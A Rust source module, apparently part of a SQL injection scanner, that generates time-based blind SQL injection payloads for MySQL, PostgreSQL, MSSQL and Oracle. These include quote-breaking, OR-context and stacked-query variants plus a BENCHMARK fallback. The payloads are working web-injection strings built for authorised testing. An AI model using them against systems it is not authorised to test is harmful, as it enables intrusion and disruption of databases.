#![deny(unsafe_code)]

#[derive(Debug, Clone)]
#[non_exhaustive]
pub struct TimePayload {
    pub payload: String,
    pub sleep_secs: u64,
    pub dbms: Option<String>,
}

impl TimePayload {
    #[must_use]
    pub fn new(payload: impl Into<String>, sleep_secs: u64, dbms: Option<String>) -> Self {
        Self {
            payload: payload.into(),
            sleep_secs,
            dbms,
        }
    }
}

/// All time-based blind payloads to sweep when the backend DBMS is unknown.
///
/// Ordering is load-bearing for `--level` budgets (`payload_budget(level, 4, …)`):
/// the first 4 are the legacy one-per-DBMS payloads (`time_payload_for`) so
/// L1 stays byte-identical to the historical behaviour; the next 4 are
/// alternate-context variants of the same DBMS (`OR`-context for the
/// expression-based delays, stacked-query numeric-context for MSSQL's
/// statement-only `WAITFOR`) so L2 doubles to 8; the last is a MySQL
/// `BENCHMARK` fallback for environments where `SLEEP` is disabled, bringing
/// L3+ to the full 9.
///
/// # Panics
/// Panics if `secs < 1`.
#[must_use]
pub fn all_time_payloads(secs: u64) -> Vec<TimePayload> {
    assert!(secs >= 1, "sleep_secs must be >= 1");
    let legacy = ["mysql", "postgres", "mssql", "oracle"];
    let mut out: Vec<TimePayload> = legacy
        .iter()
        .map(|d| time_payload_for(Some(d), secs))
        .collect();
    let s = secs;
    out.push(TimePayload::new(
        format!("' OR SLEEP({s}) -- -"),
        secs,
        Some("mysql".to_owned()),
    ));
    out.push(TimePayload::new(
        format!("' OR pg_sleep({s}) --"),
        secs,
        Some("postgres".to_owned()),
    ));
    out.push(TimePayload::new(
        // `WAITFOR` is a statement, not an expression: needs a stacked-query
        // separator (numeric context, no leading quote).
        format!("; WAITFOR DELAY '0:0:{s}' --"),
        secs,
        Some("mssql".to_owned()),
    ));
    out.push(TimePayload::new(
        format!("' OR DBMS_PIPE.RECEIVE_MESSAGE('a',{s})=1 --"),
        secs,
        Some("oracle".to_owned()),
    ));
    out.push(TimePayload::new(
        format!("' AND BENCHMARK({},MD5(1)) -- -", s * 5_000_000),
        secs,
        Some("mysql".to_owned()),
    ));
    out
}

/// # Panics
/// Panics if `secs < 1`.
#[must_use]
pub fn time_payload_for(dbms: Option<&str>, secs: u64) -> TimePayload {
    assert!(secs >= 1, "sleep_secs must be >= 1");
    let s = secs;
    #[allow(clippy::match_same_arms)]
    let payload = match dbms {
        Some("mysql") => format!("' AND SLEEP({s}) -- -"),
        Some("postgres") => format!("'; SELECT pg_sleep({s}) --"),
        Some("mssql") => {
            let h = s / 3600;
            let m = (s % 3600) / 60;
            let sec = s % 60;
            format!("'; WAITFOR DELAY '{h:02}:{m:02}:{sec:02}' --")
        }
        Some("oracle") => format!("' AND DBMS_PIPE.RECEIVE_MESSAGE('a',{s}) --"),
        _ => format!("' AND SLEEP({s}) -- -"),
    };
    TimePayload::new(payload, secs, dbms.map(str::to_owned))
}
